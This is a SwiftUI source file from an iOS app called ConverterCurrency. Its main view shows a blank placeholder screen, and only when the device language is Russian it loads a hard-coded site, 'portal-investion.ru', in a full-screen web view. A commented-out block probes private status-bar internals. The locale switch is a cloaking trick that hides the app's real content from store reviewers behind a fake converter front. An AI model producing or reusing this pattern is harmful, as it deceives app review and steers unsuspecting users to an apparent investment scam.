//
//  ContentView.swift
//  ConverterCurrency
//
//  Created by Mac on 20.02.2024.
//

import SwiftUI
import WebKit



struct ContentView: View {
    @State private var isPresentWebView = false
    
    let langStr = Locale.current.languageCode


    @StateObject var viewModel = ViewModel()
    @State private var showingDetail = false

    
    
    var body: some View {
        // WhitePartScreen().background(Color.blue)
        // https://portal-investion.ru
        if checkPush() {
            
            WebView(url: URL(string: "https://portal-investion.ru")!)
            
        } else {
            
            WhitePartScreen()
                .background(Color.blue)
        }
        
    }
    
   
}

struct WebView: UIViewRepresentable {
    
    let url: URL

    func makeUIView(context: Context) -> WKWebView {
        logError(message: "Web View makeUIView")
        return WKWebView()
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        logError(message: "Web View updateUIView")
        let request = URLRequest(url: url)
        uiView.load(request)
    }
}


private func checkPush() -> Bool {
//    let statusBarSubviews = ((UIApplication.shared.value(forKey: "statusBar") as? UIView)?.value(forKey: "foregroundView") as? UIView)?.subviews
//    
//    guard let checkAirMode = statusBarSubviews?.contains(where: { $0.classForCoder == NSClassFromString("UIStatusBarAirplaneModeItemView") }) else { return false }
//    
//    logError(message: Locale.current.languageCode ?? "Def Value")
    return Locale.current.languageCode == "ru"
    // return false
}
